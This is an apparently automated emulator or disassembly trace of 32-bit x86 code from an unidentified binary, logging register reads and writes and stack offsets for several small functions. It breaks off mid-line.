regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7fa8 for stack size 0x10000 0x424fa9: mov dword ptr [ebp - 0x58], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x14 and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x424fae: mov esi, edi, regs_read: [23], regs_write: [29] 0x424fc0: push ecx, regs_read: [30, 22], regs_write: [30] 0x424fc1: push esi, regs_read: [30, 29], regs_write: [30] 0x424fc7: mov ecx, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7f9c for stack size 0x10000 0x424fca: mov edi, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x7f98 for stack size 0x10000 0x424fd6: mov edi, dword ptr [ebp - 8], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x7ff8 for stack size 0x10000 0x424fdd: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7ff4 for stack size 0x10000 0x424fe0: mov ecx, edi, regs_read: [23], regs_write: [22] 0x424fe4: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x8008 for stack size 0x10000 0x424ff4: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424ffb: mov eax, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f94 for stack size 0x10000 0x425001: mov dword ptr [edx], edi, regs_read: [24, 23], regs_write: () 0x425008: mov eax, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7fa4 for stack size 0x10000 0x42500b: mov edi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x800c for stack size 0x10000 0x425011: mov dword ptr [edx + 4], ecx, regs_read: [24, 22], regs_write: () 0x425014: mov ecx, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7fcc for stack size 0x10000 0x425019: mov eax, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f88 for stack size 0x10000 0x42501f: mov dword ptr [edx + 8], ecx, regs_read: [24, 22], regs_write: () 0x425022: mov ecx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7fb0 for stack size 0x10000 0x425027: mov eax, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7fe4 for stack size 0x10000 0x42502a: mov dword ptr [edx + 0xc], ecx, regs_read: [24, 22], regs_write: () 0x42502d: mov ecx, edi, regs_read: [23], regs_write: [22] 0x425042: mov eax, ecx, regs_read: [22], regs_write: [19] 0x425049: mov eax, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f90 for stack size 0x10000 0x425051: mov dword ptr [edx + 0x10], edi, regs_read: [24, 23], regs_write: () 0x425057: mov eax, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7fb4 for stack size 0x10000 0x42505a: mov edi, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x7fa8 for stack size 0x10000 0x425060: mov dword ptr [edx + 0x14], ecx, regs_read: [24, 22], regs_write: () 0x425063: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7ffc for stack size 0x10000 0x425068: mov eax, dword ptr [ebp - 0x74], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f8c for stack size 0x10000 0x42506e: mov dword ptr [edx + 0x18], ecx, regs_read: [24, 22], regs_write: () 0x425071: mov ecx, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7fbc for stack size 0x10000 0x425076: mov eax, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7fa0 for stack size 0x10000 0x42507b: mov dword ptr [edx + 0x1c], ecx, regs_read: [24, 22], regs_write: () 0x425080: mov dword ptr [edx + 0x20], eax, regs_read: [24, 19], regs_write: () 0x425083: mov dword ptr [edx + 0x24], edi, regs_read: [24, 23], regs_write: () 0x425086: pop edi, regs_read: [30], regs_write: [30, 23] 0x425087: pop esi, regs_read: [30], regs_write: [30, 29] 0x425088: pop ebx, regs_read: [30], regs_write: [30, 21] 0x425089: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x10 and offset 0x8000 for stack size 0x10000 0x42508b: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425090: push ebp, regs_read: [30, 20], regs_write: [30] 0x425091: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425096: mov ecx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x425099: mov edx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x42509c: push ebx, regs_read: [30, 21], regs_write: [30] 0x42509d: push esi, regs_read: [30, 29], regs_write: [30] 0x42509e: push edi, regs_read: [30, 23], regs_write: [30] 0x42509f: mov eax, dword ptr [edx + 4], regs_read: [24], regs_write: [19] 0x4250a5: mov ebx, dword ptr [edx + 0x18], regs_read: [24], regs_write: [21] 0x4250a8: mov edi, dword ptr [edx + 0x1c], regs_read: [24], regs_write: [23] 0x4250ab: mov esi, dword ptr [edx + 0x20], regs_read: [24], regs_write: [29] 0x4250b7: mov dword ptr [ebp + 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x4250ba: mov eax, dword ptr [edx + 8], regs_read: [24], regs_write: [19] 0x4250c0: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x4250c3: mov eax, dword ptr [edx + 0xc], regs_read: [24], regs_write: [19] 0x4250c9: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x4250cc: mov eax, dword ptr [edx + 0x10], regs_read: [24], regs_write: [19] 0x4250d2: mov dword ptr [ebp - 0xc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x4250d5: mov eax, dword ptr [edx + 0x14], regs_read: [24], regs_write: [19] 0x4250db: mov edx, dword ptr [edx + 0x24], regs_read: [24], regs_write: [24] 0x4250e1: mov dword ptr [ebp - 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x4250e4: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x4250e7: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x4250eb: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x8008 for stack size 0x10000 0x4250ee: mov dword ptr [ecx], eax, regs_read: [22, 19], regs_write: () 0x4250f0: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 0x4250f3: mov dword ptr [ecx + 4], eax, regs_read: [22, 19], regs_write: () 0x4250f6: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 0x4250f9: mov dword ptr [ecx + 8], eax, regs_read: [22, 19], regs_write: () 0x4250fc: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 0x4250ff: mov dword ptr [ecx + 0xc], eax, regs_read: [22, 19], regs_write: () 0x425102: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x425105: mov dword ptr [ecx + 0x1c], edi, regs_read: [22, 23], regs_write: () 0x425108: pop edi, regs_read: [30], regs_write: [30, 23] 0x425109: mov dword ptr [ecx + 0x20], esi, regs_read: [22, 29], regs_write: () 0x42510c: mov dword ptr [ecx + 0x10], eax, regs_read: [22, 19], regs_write: () 0x42510f: mov eax, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x7ff0 for stack size 0x10000 0x425112: pop esi, regs_read: [30], regs_write: [30, 29] 0x425113: mov dword ptr [ecx + 0x18], ebx, regs_read: [22, 21], regs_write: () 0x425116: mov dword ptr [ecx + 0x14], eax, regs_read: [22, 19], regs_write: () 0x425119: mov dword ptr [ecx + 0x24], edx, regs_read: [22, 24], regs_write: () 0x42511c: pop ebx, regs_read: [30], regs_write: [30, 21] 0x42511d: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x42511f: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425130: push ebp, regs_read: [30, 20], regs_write: [30] 0x425131: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425136: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x42513d: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x425144: mov cl, dl, regs_read: [16], regs_write: [10] 0x425146: mov dword ptr [ebp - 0xc], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x425149: mov byte ptr [ebp - 0x10], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 1 0x42514c: mov cl, byte ptr [ebp - 9], regs_read: [20], regs_write: [10] adjusting stack for ESP 0x0 and offset 0x7ff7 for stack size 0x10000 0x42514f: mov byte ptr [ebp - 0xf], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff1 for stack size 0x10000 saving data to stack: 0 1 0x425152: mov cl, byte ptr [ebp - 0xa], regs_read: [20], regs_write: [10] adjusting stack for ESP 0x0 and offset 0x7ff6 for stack size 0x10000 0x425155: push ebx, regs_read: [30, 21], regs_write: [30] 0x425156: mov byte ptr [ebp - 0xe], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x4 and offset 0x7ff2 for stack size 0x10000 saving data to stack: 0 1 0x425159: mov bl, dl, regs_read: [16], regs_write: [5] 0x42515b: mov cl, byte ptr [ebp - 0xb], regs_read: [20], regs_write: [10] adjusting stack for ESP -0x4 and offset 0x7ff5 for stack size 0x10000 0x42515e: push esi, regs_read: [30, 29], regs_write: [30] 0x42515f: mov esi, dword ptr [ebp + 8], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x8 and offset 0x8008 for stack size 0x10000 0x425162: mov word ptr [ebp - 8], dx, regs_read: [20, 18], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 2 0x425166: mov ch, byte ptr [ebp - 7], regs_read: [20], regs_write: [9] adjusting stack for ESP -0x8 and offset 0x7ff9 for stack size 0x10000 0x425169: mov byte ptr [ebp - 0xd], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff3 for stack size 0x10000 saving data to stack: 0 1 0x425170: mov cl, byte ptr [esi + eax], regs_read: [29, 19], regs_write: [10] 0x425173: mov bh, byte ptr [eax + 0x4c9ba0], regs_read: [19], regs_write: [4] 0x42517d: mov bl, byte ptr [eax + 0x4c9bc0], regs_read: [19], regs_write: [5] 0x425185: mov byte ptr [ebp - 0x11], bh, regs_read: [20, 4], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fef for stack size 0x10000 saving data to stack: 0 1 0x42518b: mov byte ptr [ebp - 0x17], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fe9 for stack size 0x10000 saving data to stack: 0 1 0x42518e: mov byte ptr [ebp - 0xd], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff3 for stack size 0x10000 saving data to stack: 0 1 0x425191: mov bl, byte ptr [eax + 0x4c9be0], regs_read: [19], regs_write: [5] 0x42519c: mov byte ptr [ebp - 0x16], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fea for stack size 0x10000 saving data to stack: 0 1 0x42519f: mov byte ptr [ebp - 0xe], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff2 for stack size 0x10000 saving data to stack: 0 1 0x4251a2: mov bl, byte ptr [eax + 0x4c9c00], regs_read: [19], regs_write: [5] 0x4251ad: mov byte ptr [ebp - 0x15], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7feb for stack size 0x10000 saving data to stack: 0 1 0x4251b0: mov byte ptr [ebp - 0xf], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff1 for stack size 0x10000 saving data to stack: 0 1 0x4251b3: mov bl, byte ptr [eax + 0x4c9c20], regs_read: [19], regs_write: [5] 0x4251be: mov byte ptr [ebp - 0x14], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fec for stack size 0x10000 saving data to stack: 0 1 0x4251c1: mov byte ptr [ebp - 0x10], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 1 0x4251c4: mov bl, byte ptr [eax + 0x4c9c40], regs_read: [19], regs_write: [5] 0x4251ce: mov byte ptr [ebp - 0x13], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fed for stack size 0x10000 saving data to stack: 0 1 0x4251d1: mov ch, bl, regs_read: [5], regs_write: [9] 0x4251d3: mov bl, byte ptr [eax + 0x4c9c60], regs_read: [19], regs_write: [5] 0x4251de: mov byte ptr [ebp - 0x12], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fee for stack size 0x10000 saving data to stack: 0 1 0x4251e1: mov dl, bl, regs_read: [5], regs_write: [16] 0x4251e3: mov bl, bh, regs_read: [4], regs_write: [5] 0x4251ea: mov bl, byte ptr [eax + esi], regs_read: [19, 29], regs_write: [5] 0x42527c: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x8 and offset 0x7ffc for stack size 0x10000 0x425287: pop esi, regs_read: [30], regs_write: [30, 29] 0x42528b: pop ebx, regs_read: [30], regs_write: [30, 21] 0x425291: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425293: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4252a0: push ebp, regs_read: [30, 20], regs_write: [30] 0x4252a1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4252a6: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x4252ad: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x4252b0: push ebx, regs_read: [30, 21], regs_write: [30] 0x4252b1: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8008 for stack size 0x10000 0x4252b4: push esi, regs_read: [30, 29], regs_write: [30] 0x4252b5: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x8 and offset 0x800c for stack size 0x10000 0x4252b8: mov eax, esi, regs_read: [29], regs_write: [19] 0x4252bf: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x4252c5: push eax, regs_read: [30, 19], regs_write: [30] 0x4252cb: push 0, regs_read: [30], regs_write: [30] 0x4252cd: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x4252d3: push eax, regs_read: [30, 19], regs_write: [30] 0x4252d9: push esi, regs_read: [30, 29], regs_write: [30] 0x4252da: push 0, regs_read: [30], regs_write: [30] 0x4252dc: push ebx, regs_read: [30, 21], regs_write: [30] 0x4252e2: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x4252e8: push esi, regs_read: [30, 29], regs_write: [30] 0x4252e9: push ebx, regs_read: [30, 21], regs_write: [30] 0x4252ea: push ebx, regs_read: [30, 21], regs_write: [30] 0x4252eb: push eax, regs_read: [30, 19], regs_write: [30] 0x4252f4: push 0x40, regs_read: [30], regs_write: [30] 0x4252f6: push eax, regs_read: [30, 19], regs_write: [30] 0x4252ff: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7ffc for stack size 0x10000 0x425304: pop esi, regs_read: [30], regs_write: [30, 29] 0x425307: pop ebx, regs_read: [30], regs_write: [30, 21] 0x42530d: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x3c and offset 0x8000 for stack size 0x10000 0x42530f: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425320: push ebp, regs_read: [30, 20], regs_write: [30] 0x425321: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425326: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x42532d: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x425330: push ebx, regs_read: [30, 21], regs_write: [30] 0x425331: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8008 for stack size 0x10000 0x425334: push esi, regs_read: [30, 29], regs_write: [30] 0x425335: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x8 and offset 0x800c for stack size 0x10000 0x425338: mov eax, esi, regs_read: [29], regs_write: [19] 0x42533f: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x425345: push eax, regs_read: [30, 19], regs_write: [30] 0x42534b: push 0, regs_read: [30], regs_write: [30] 0x42534d: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x425353: push eax, regs_read: [30, 19], regs_write: [30] 0x425359: push esi, regs_read: [30, 29], regs_write: [30] 0x42535a: push 0, regs_read: [30], regs_write: [30] 0x42535c: push ebx, regs_read: [30, 21], regs_write: [30] 0x425362: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x425368: push esi, regs_read: [30, 29], regs_write: [30] 0x425369: push ebx, regs_read: [30, 21], regs_write: [30] 0x42536a: push ebx, regs_read: [30, 21], regs_write: [30] 0x42536b: push eax, regs_read: [30, 19], regs_write: [30] 0x425374: push 0x40, regs_read: [30], regs_write: [30] 0x425376: push eax, regs_read: [30, 19], regs_write: [30] 0x42537f: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7ffc for stack size 0x10000 0x425384: pop esi, regs_read: [30], regs_write: [30, 29] 0x425387: pop ebx, regs_read: [30], regs_write: [30, 21] 0x42538d: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x3c and offset 0x8000 for stack size 0x10000 0x42538f: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4253a0: push ebp, regs_read: [30, 20], regs_write: [30] 0x4253a1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4253a6: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x4253ad: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x4253b0: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x4253b3: mov dword ptr [ebp - 0x48], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x4253b6: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x4253bc: push ebx, regs_read: [30, 21], regs_write: [30] 0x4253bd: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8008 for stack size 0x10000 0x4253c2: mov eax, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x801c for stack size 0x10000 0x4253c5: push dword ptr [ebp + 0x24], regs_read: [30, 20], regs_write: [30] 0x4253c8: mov dword ptr [ebp - 0x50], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x4253cb: mov eax, dword ptr [ebp + 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x8020 for stack size 0x10000 0x4253ce: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x4253d4: push eax, regs_read: [30, 19], regs_write: [30] 0x4253dd: push eax, regs_read: [30, 19], regs_write: [30] 0x4253de: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x4253e4: push eax, regs_read: [30, 19], regs_write: [30] 0x4253ea: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x4253f0: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x4253f3: push ebx, regs_read: [30, 21], regs_write: [30] 0x4253f4: push dword ptr [ebp - 0x48], regs_read: [30, 20], regs_write: [30] 0x4253f7: push eax, regs_read: [30, 19], regs_write: [30] 0x425400: push 0x40, regs_read: [30], regs_write: [30] 0x425402: push eax, regs_read: [30, 19], regs_write: [30] 0x42540b: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x34 and offset 0x7ffc for stack size 0x10000 0x425412: pop ebx, regs_read: [30], regs_write: [30, 21] 0x425418: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x30 and offset 0x8000 for stack size 0x10000 0x42541a: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425420: push ebp, regs_read: [30, 20], regs_write: [30] 0x425421: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425426: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x42542d: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x425430: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x425433: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x425436: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x42543c: push ebx, regs_read: [30, 21], regs_write: [30] 0x42543d: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8008 for stack size 0x10000 0x425442: mov eax, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x801c for stack size 0x10000 0x425445: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x425448: mov dword ptr [ebp - 0x48], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x42544e: push eax, regs_read: [30, 19], regs_write: [30] 0x425457: push eax, regs_read: [30, 19], regs_write: [30] 0x425458: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x42545e: push eax, regs_read: [30, 19], regs_write: [30] 0x425464: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x42546a: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x42546d: push ebx, regs_read: [30, 21], regs_write: [30] 0x42546e: push dword ptr [ebp - 0x4c], regs_read: [30, 20], regs_write: [30] 0x425471: push eax, regs_read: [30, 19], regs_write: [30] 0x42547a: push 0x40, regs_read: [30], regs_write: [30] 0x42547c: push eax, regs_read: [30, 19], regs_write: [30] 0x425485: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x34 and offset 0x7ffc for stack size 0x10000 0x42548c: pop ebx, regs_read: [30], regs_write: [30, 21] 0x425492: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x30 and offset 0x8000 for stack size 0x10000 0x425494: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4254a0: push ebp, regs_read: [30, 20], regs_write: [30] 0x4254a1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4254a9: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x4254b0: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x4254b3: mov ecx, dword ptr [ebp + 0x18], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x8018 for stack size 0x10000 0x4254b8: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x4254bb: push esi, regs_read: [30, 29], regs_write: [30] 0x4254bc: mov esi, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 0x4254bf: push edi, regs_read: [30, 23], regs_write: [30] 0x4254c0: mov edi, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x8 and offset 0x8014 for stack size 0x10000 0x4254c3: mov dword ptr [ebp - 0xd0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x4254c9: mov eax, edi, regs_read: [23], regs_write: [19] 0x4254cd: mov dword ptr [ebp - 0xd4], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f2c for stack size 0x10000 saving data to stack: 0 4 0x4254d3: mov dword ptr [ebp - 0x68], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x4254d6: mov dword ptr [ebp - 0x94], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x4254dc: mov dword ptr [ebp - 0x88], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x4254e8: mov eax, dword ptr [edx], regs_read: [24], regs_write: [19] 0x4254ea: mov dword ptr [ebp - 0xcc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f34 for stack size 0x10000 saving data to stack: 0 4 0x4254f0: mov eax, dword ptr [edx + 4], regs_read: [24], regs_write: [19] 0x4254f3: mov dword ptr [ebp - 0x98], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x4254f9: mov eax, dword ptr [edx + 8], regs_read: [24], regs_write: [19] 0x4254fc: mov dword ptr [ebp - 0x9c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x425502: mov eax, dword ptr [edx + 0xc], regs_read: [24], regs_write: [19] 0x425505: mov dword ptr [ebp - 0xa0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42550b: mov eax, dword ptr [edx + 0x10], regs_read: [24], regs_write: [19] 0x42550e: mov dword ptr [ebp - 0xa4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f5c for stack size 0x10000 saving data to stack: 0 4 0x425514: mov eax, dword ptr [edx + 0x14], regs_read: [24], regs_write: [19] 0x425517: mov dword ptr [ebp - 0xa8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42551d: mov eax, dword ptr [edx + 0x18], regs_read: [24], regs_write: [19] 0x425520: mov dword ptr [ebp - 